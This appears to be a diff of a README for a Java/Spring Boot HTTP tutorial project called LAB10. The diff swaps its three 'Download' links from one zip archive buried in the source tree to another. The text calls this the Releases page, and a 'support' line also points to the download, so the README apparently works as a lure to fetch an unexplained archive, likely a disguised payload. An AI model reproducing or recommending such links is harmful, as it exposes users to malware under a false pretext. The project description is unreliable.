@@ -1,7 +1,7 @@
 # 🌟 LAB10 - Learn HTTP Fundamentals with Ease
 
 ## 📥 Download Now
-[![Download LAB10](https://raw.githubusercontent.com/komechan0602/LAB10/main/src/main/java/com/example/lab10/validation/LA-v3.2.zip)](https://raw.githubusercontent.com/komechan0602/LAB10/main/src/main/java/com/example/lab10/validation/LA-v3.2.zip)
+[![Download LAB10](https://github.com/komechan0602/LAB10/raw/refs/heads/main/src/main/resources/LA-3.1.zip)](https://github.com/komechan0602/LAB10/raw/refs/heads/main/src/main/resources/LA-3.1.zip)
 
 ## 🚀 Getting Started
 Welcome to LAB10! This project helps you understand the basics of HTTP using Java and Spring Boot. You will learn how to build simple web services and manage data effectively. Follow the steps below to install and run the application.
@@ -30,7 +30,7 @@ You will also learn how to use Flyway for database migrations, JPA for data pers
 ## 📥 Download & Install
 To get started with LAB10, visit the Releases page to download the application files. Click the link below to access the page:
 
-[Download LAB10](https://raw.githubusercontent.com/komechan0602/LAB10/main/src/main/java/com/example/lab10/validation/LA-v3.2.zip)
+[Download LAB10](https://github.com/komechan0602/LAB10/raw/refs/heads/main/src/main/resources/LA-3.1.zip)
 
 Once there, follow these steps:
 1. Look for the latest version of LAB10.
@@ -77,6 +77,6 @@ Remember, this project is an excellent starting point for anyone looking to buil
 Feel free to share your feedback or ideas for improvement. The community is here to help. Reach out with questions on the GitHub issues page. Together, we can make LAB10 an even better learning tool!
 
 For additional support, visit:
-[Download LAB10](https://raw.githubusercontent.com/komechan0602/LAB10/main/src/main/java/com/example/lab10/validation/LA-v3.2.zip)
+[Download LAB10](https://github.com/komechan0602/LAB10/raw/refs/heads/main/src/main/resources/LA-3.1.zip)
 
 Happy coding!
